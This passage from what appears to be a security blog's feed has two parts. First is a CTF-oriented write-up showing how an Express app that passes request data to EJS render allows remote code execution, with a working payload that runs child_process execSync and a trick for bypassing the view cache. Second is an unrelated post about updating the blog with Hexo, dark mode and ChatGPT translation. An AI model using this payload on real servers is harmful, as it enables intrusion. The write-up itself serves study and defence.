class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The key point here is the middle part:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Pull a few things from known locations</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    opts<span class="token punctuation">.</span>views <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view cache'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    opts<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// Undocumented after Express 2, but still usable, esp. for</span>  <span class="token comment">// items that are unsafe to be passed along with data, like `root`</span>  viewOpts <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view options'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>viewOpts<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    utils<span class="token punctuation">.</span><span class="token function">shallowCopy</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> viewOpts<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>In short, setting <code>data.settings[&#39;view options&#39;]</code> can override <code>opts</code>.</p><p>Next, follow down to <code>handleCache</code>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">handleCache</span><span class="token punctuation">(</span><span class="token parameter">options<span class="token punctuation">,</span> template</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> func<span class="token punctuation">;</span>  <span class="token keyword">var</span> filename <span class="token operator">=</span> options<span class="token punctuation">.</span>filename<span class="token punctuation">;</span>  <span class="token keyword">var</span> hasTemplate <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'cache option requires a filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    func <span class="token operator">=</span> exports<span class="token punctuation">.</span>cache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> func<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasTemplate<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      template <span class="token operator">=</span> <span class="token function">fileLoader</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>_BOM<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasTemplate<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// istanbul ignore if: should not happen at all</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Internal EJS error: no file name or template '</span>                    <span class="token operator">+</span> <span class="token string">'provided'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    template <span class="token operator">=</span> <span class="token function">fileLoader</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>_BOM<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  func <span class="token operator">=</span> exports<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    exports<span class="token punctuation">.</span>cache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> func<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> func<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>If <code>options.cache</code> is set, use the already compiled content in the cache, otherwise compile it again.</p><p>The most important part is <a href="https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L571">compile</a>, which has the following code:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>client<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  src <span class="token operator">=</span> <span class="token string">'escapeFn = escapeFn || '</span> <span class="token operator">+</span> escapeFn<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>compileDebug<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    src <span class="token operator">=</span> <span class="token string">'rethrow = rethrow || '</span> <span class="token operator">+</span> rethrow<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It will use <code>escapeFn</code> to concatenate the code.</p><p>So we just need to pass in:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">settings</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token string-property property">'view options'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">client</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      <span class="token literal-property property">escapeFunction</span><span class="token operator">:</span> <span class="token string">'(() => &#123;&#125;);return process.mainModule.require("child_process").execSync("id").toString()'</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>to execute any code and achieve RCE.</p><h2><span id="cache-issue">Cache Issue</span></h2><p>Although the previous explanation was smooth, there is a cache issue.</p><p>Under production mode, view cache will be <a href="https://github.com/expressjs/express/blob/4.18.2/lib/application.js#L126">automatically enabled</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>env <span class="token operator">===</span> <span class="token string">'production'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enable</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>And this parameter will be automatically passed to options when rendering:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// set .cache unless explicitly provided</span><span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  renderOptions<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enabled</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Although we can override the original options through view options, if the original options already contain cache, it will be overridden again:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">utils<span class="token punctuation">.</span><span class="token function">shallowCopyFromList</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> data<span class="token punctuation">,</span> _OPTS_PASSABLE_WITH_DATA_EXPRESS<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>If we cannot override cache, then we cannot use the above method because the template will not be recompiled.</p><p>However, it doesn’t matter, fortunately this is JavaScript, pay attention to this line of code:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  renderOptions<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enabled</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>If <code>renderOptions.cache</code> is null, it will be set, and <code>0 == null</code> is false, so we can pass in <code>cache: 0</code> to bypass the check and make <code>if (options.cache)</code> false.</p><h2><span id="ejs-authors-view">EJS Author’s View</span></h2><p>In fact, EJS has had many related issues since the past, the list is as follows:</p><ul><li><a href="https://github.com/mde/ejs/issues/451">Unrestricted render option may lead to a RCE vulnerability #451</a></li><li><a href="https://github.com/mde/ejs/pull/601">Mitigate prototype pollution effects #601</a></li><li><a href="https://github.com/mde/ejs/issues/663">[Vulnerability] Server side template injection leads to RCE #663</a></li><li><a href="https://github.com/mde/ejs/issues/720">EJS, Server side template injection ejs@3.1.9 Latest #720</a></li><li><a href="https://github.com/mde/ejs/issues/735">EJS@3.1.9 has a server-side template injection vulnerability (Unfixed) #735</a></li></ul><p>The author’s stance has remained the same from the past to the present:</p><blockquote><p>The problem here is that EJS is simply a way of executing JS to render a template. If you allow passing of arbitrary&#x2F;unsanitized options and data to the render function, you will encounter all security problems that would occur as a result of arbitrary code execution. Henny Youngman used to tell a joke: “The patient says, ‘Doctor, it hurts when I do this.’ So the doctor says, ‘Then don’t do that!’” I’m open to PRs that improve security, but this looks to me to be far beyond the purview of the library. These responsibilities live squarely in userland.</p></blockquote><p>Basically, if developers want to use the library in this way, the author cannot do anything about it. This is not the responsibility of EJS and end users should not be allowed to pass in the entire object.</p><p>Recently, EJS developers have also added a notice in the README and on the official website due to receiving many similar issue reports:</p><blockquote><p>Security professionals, before reporting any security issues, please reference the SECURITY.md in this project, in particular, the following: “EJS is effectively a JavaScript runtime. Its entire job is to execute JavaScript. If you run the EJS render method without checking the inputs yourself, you are responsible for the results.”</p></blockquote><p>So this trick can be used now and in the future. If someone can control the object during rendering, it means that RCE can be achieved.</p><p>Later, I want to write another article from the developer’s perspective. Although what the EJS author said makes sense, at least as a library, EJS should remind developers in the documentation not to use it in this way. Although there is already a prompt now, it is more targeted at asking security researchers not to report, rather than asking developers not to use it in this way.</p><p>Or maybe this is actually a bad coding practice. There should not have been such a pattern in the first place that allows others to exploit it.</p><p>I haven’t figured this out yet. I’ll write about it when I do.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Originally, I intended to write this article from a developer’s perspective. However, due to time constraints, I will first write a CTF-oriented article to record this issue. I will write from a developer’s perspective when I have more time.&lt;/p&gt;
&lt;p&gt;In short, this article discusses the problems caused by using the following pattern:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-javascript&quot; data-language=&quot;javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; express &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;express&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; app &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; port &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3000&lt;/span&gt;

app&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;view engine&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;ejs&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

app&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;req&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;res&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    res&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;index&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; req&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;query&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

app&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
  console&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;Example app listening on port &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;$&amp;#123;&lt;/span&gt;port&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Updating Blog with chatGPT</title>
    <link href="https://blog.huli.tw/2023/06/20/en/update-blog-with-chatgpt/"/>
    <id>https://blog.huli.tw/2023/06/20/en/update-blog-with-chatgpt/</id>
    <published>2023-06-20T06:10:44.000Z</published>
    <updated>2023-06-20T06:37:57.901Z</updated>
    
    <content type="html"><![CDATA[<p>It’s been a long time since I made any major changes to my blog structure. Hexo has already released v6, and v7 is currently in beta, but my blog is still on hexo3.</p><p>Recently, I had some free time and decided to update my blog, and also use chatGPT as a helper.</p><p>The changes I made this time are:</p><ol><li>Upgraded Hexo version</li><li>Modified syntax highlight</li><li>Dark mode</li><li>Automatic translation (highlight)</li></ol><span id="more"></span><h2><span id="upgraded-hexo-version">Upgraded Hexo version</span></h2><p>The upgrade was smoother than I expected. I installed <code>npm-upgrade</code> following the tutorial I found online, and after running it, the upgrade was done. There wasn’t much to adjust after the upgrade.</p><p>It was really smooth!</p><h2><span id="modified-syntax-highlight">Modified syntax highlight</span></h2><p>I used to use highlight.js, but I wanted to switch to another one for a long time because it doesn’t support JSX.</p><p>After upgrading, I found that Hexo has built-in support for another one called Prism.js, so I switched to it. I just needed to modify the configuration file and manually add the style, which was quite simple.</p><p>The only trouble was that some classes conflicted with other libraries, so I had to adjust them manually.</p><h2><span id="dark-mode">Dark mode</span></h2><p><img src="/img/update-blog-with-chatgpt/p1.png" alt="dark mode"></p><p>I used <a href="https://bulma.io/">Bulma</a> CSS library for my theme, but it doesn’t support dark mode, so I had to create one myself.</p><p>The way I did it was quite simple. I first found the color of every word and background on the page and replaced them with CSS variables. Finally, I added some simple JavaScript to complete it.</p><p>The CSS part looks like this:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">:root</span> <span class="token punctuation">&#123;</span>  <span class="token property">--main-text-color</span><span class="token punctuation">:</span> #4a4a4a<span class="token punctuation">;</span>  <span class="token property">--main-bg-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>  <span class="token property">--main-border-color</span><span class="token punctuation">:</span> #dbdbdb<span class="token punctuation">;</span>  <span class="token property">--title-text-color</span><span class="token punctuation">:</span> #363636<span class="token punctuation">;</span>  <span class="token property">--link-text-color</span><span class="token punctuation">:</span> #3273dc<span class="token punctuation">;</span>  <span class="token property">--link-hover-text-color</span><span class="token punctuation">:</span> #363636<span class="token punctuation">;</span>  <span class="token property">--code-bg-color</span><span class="token punctuation">:</span> whitesmoke<span class="token punctuation">;</span>  <span class="token property">--code-text-color</span><span class="token punctuation">:</span> #ff3860<span class="token punctuation">;</span>  <span class="token property">--tag-bg-color</span><span class="token punctuation">:</span> whitesmoke<span class="token punctuation">;</span>  <span class="token property">--tag-text-color</span><span class="token punctuation">:</span> #363636<span class="token punctuation">;</span>  <span class="token property">--quote-bg-color</span><span class="token punctuation">:</span> whitesmoke<span class="token punctuation">;</span>  <span class="token property">--nav-link-text-color</span><span class="token punctuation">:</span> darkgray<span class="token punctuation">;</span>  <span class="token property">--notice-bg-color</span><span class="token punctuation">:</span> #ffe4c4<span class="token punctuation">;</span>  <span class="token property">--archive-time-color</span><span class="token punctuation">:</span> #888<span class="token punctuation">;</span>  <span class="token property">--archive-hover-border-color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">body.dark-mode</span> <span class="token punctuation">&#123;</span>  <span class="token property">--main-text-color</span><span class="token punctuation">:</span> #f8f8f8<span class="token punctuation">;</span>  <span class="token property">--main-bg-color</span><span class="token punctuation">:</span> #061320<span class="token punctuation">;</span>  <span class="token property">--main-border-color</span><span class="token punctuation">:</span> #dbdbdb<span class="token punctuation">;</span>  <span class="token property">--title-text-color</span><span class="token punctuation">:</span> #fafafa<span class="token punctuation">;</span>  <span class="token property">--link-text-color</span><span class="token punctuation">:</span> #27ebda<span class="token punctuation">;</span>  <span class="token property">--link-hover-text-color</span><span class="token punctuation">:</span> #98fff6<span class="token punctuation">;</span>  <span class="token property">--code-bg-color</span><span class="token punctuation">:</span> #324b7e<span class="token punctuation">;</span>  <span class="token property">--code-text-color</span><span class="token punctuation">:</span> #f7f7f7<span class="token punctuation">;</span>  <span class="token property">--tag-bg-color</span><span class="token punctuation">:</span> whitesmoke<span class="token punctuation">;</span>  <span class="token property">--tag-text-color</span><span class="token punctuation">:</span> #363636<span class="token punctuation">;</span>  <span class="token property">--quote-bg-color</span><span class="token punctuation">:</span> #49495e<span class="token punctuation">;</span>  <span class="token property">--nav-link-text-color</span><span class="token punctuation">:</span> #b4b5b4<span class="token punctuation">;</span>  <span class="token property">--notice-bg-color</span><span class="token punctuation">:</span> #257800<span class="token punctuation">;</span>  <span class="token property">--archive-time-color</span><span class="token punctuation">:</span> #ddd<span class="token punctuation">;</span>  <span class="token property">--archive-hover-border-color</span><span class="token punctuation">:</span> #51ce97<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>And the JavaScript looks like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'dark-mode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'dark-mode'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'true'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'dark-mode'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>matchMedia <span class="token operator">&amp;&amp;</span> window<span class="token punctuation">.</span><span class="token function">matchMedia</span><span class="token punctuation">(</span><span class="token string">'(prefers-color-scheme: dark)'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'dark-mode'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It took me about half a day to modify and test it, and then it was done.</p><p>I also solved the problem of CSS size and used this service to remove unused CSS: <a href="https://purifycss.online/">https://purifycss.online/</a></p><p>Although there may still be some residual or mistakenly deleted CSS, remember to check it again after using it.</p><h2><span id="automatic-translation">Automatic translation</span></h2><p>The highlight of this update is the automatic translation feature, which relies heavily on chatGPT.</p><p><img src="/img/update-blog-with-chatgpt/p3.png" alt="translation"></p><p>The most important part of the translation is done by <a href="https://github.com/smikitky/markdown-gpt-translator">markdown-gpt-translator</a>, which automatically divides the text into paragraphs and calls the API, and then assembles the results.</p><p>Another great thing is that code blocks are not uploaded, so it saves a lot of tokens, but be aware that comments in code blocks need to be translated manually.</p><p>After verifying that this translation library can be used, I started to modify it and integrate it with the automatic translation feature I wanted.</p><p>And because the TypeScript environment setup is a bit tricky, I used this tool to convert it directly to JavaScript: <a href="https://transform.tools/typescript-to-javascript">https://transform.tools/typescript-to-javascript</a></p><p>To automatically translate all the old articles, I followed these steps:</p><ol><li>List all the files of the articles</li><li>Check if the translated version exists</li><li>If it doesn’t exist, call the translation API and write it to the file</li></ol><p>I tell chatGPT to help me write some utility functions, and I adjusted and supplemented the details and the structure.</p><p><img src="/img/update-blog-with-chatgpt/p2.png" alt="chatgpt"></p><p>For my own articles, it takes about a minute to translate one, and the price is about 0.02 to 0.04 dollars. After translating more than 100 articles, it cost me less than 3 dollars, which I think is quite cheap.</p><p>However, there are still many places that need to be manually adjusted. I put the code and things to note here: <a href="https://github.com/aszx87410/huli-blog/tree/master/apps/translator">https://github.com/aszx87410/huli-blog/tree/master/apps/translator</a></p><p>Actually, after the translation was completed, I wanted to review them one by one, but I found it too time-consuming, so I left it for later.</p><h2><span id="updating-open-graph-image">Updating Open Graph Image</span></h2><p>I previously wrote a small function to generate a preview image, but many articles didn’t use this function before. This time, I used chatGPT to help me write a small program that can quickly convert them.</p><p>I slightly modified the previous code, scanned all the old articles, automatically generated the missing ones, and added the correct path.</p><h2><span id="unfinished-features">Unfinished features</span></h2><p>Finally, a note on the unfinished features that will be more convenient to work on in the future:</p><ol><li>Update sitemap</li><li>Check English article links</li><li>Check English article content</li><li>Modify comment system</li><li>Modify multilingual RSS</li><li>Automatically compress images.</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;It’s been a long time since I made any major changes to my blog structure. Hexo has already released v6, and v7 is currently in beta, but my blog is still on hexo3.&lt;/p&gt;
&lt;p&gt;Recently, I had some free time and decided to update my blog, and also use chatGPT as a helper.&lt;/p&gt;
&lt;p&gt;The changes I made this time are:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Upgraded Hexo version&lt;/li&gt;
&lt;li&gt;Modified syntax highlight&lt;/li&gt;
&lt;li&gt;Dark mode&lt;/li&gt;
&lt;li&gt;Automatic translation (highlight)&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Others" scheme="https://blog.huli.tw/categories/Others/"/>
    
    
